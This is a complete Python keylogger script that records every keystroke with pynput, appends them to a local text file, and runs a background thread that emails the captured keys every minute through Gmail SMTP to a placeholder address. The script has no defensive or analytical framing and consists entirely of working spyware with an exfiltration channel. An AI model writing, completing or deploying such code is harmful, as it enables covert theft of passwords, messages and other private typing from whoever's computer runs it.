import smtplib
import os
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
import threading
import time

keys = []
send_interval = 60  # Time interval to send email (in seconds)
email = "your-email@gmail.com"
password = "your-email-password"
lock = threading.Lock()  # To ensure thread-safe operations on the keys list

def on_press(key):
    with lock:
        keys.append(key)
        if len(keys) % 10 == 0:  # Adjust the frequency as needed
            write_file(keys)

def write_file(keys):
    with open("BC4MC.txt", "a") as p:  # Append to the file instead of overwriting
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                p.write('\n')
            elif k.find("Key") == -1:
                p.write(k)

def send_email():
    while True:
        time.sleep(send_interval)
        with lock:
            if keys:  # Only send an email if there are keys logged
                message = MIMEMultipart()
                message['From'] = email
                message['To'] = email
                message['Subject'] = "Logged Keys"

                body = "\n".join([str(key) for key in keys])
                message.attach(MIMEText(body, 'plain'))

                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(email, password)
                    server.send_message(message)
                    server.quit()
                except Exception as e:
                    print(f"Failed to send email: {e}")

                keys.clear()  # Clear keys after sending email

def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    if not email or not password:
        print("Email or password not set.")
        exit(1)

    # Start email sending thread
    email_thread = threading.Thread(target=send_email)
    email_thread.daemon = True
    email_thread.start()

    # Set up the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
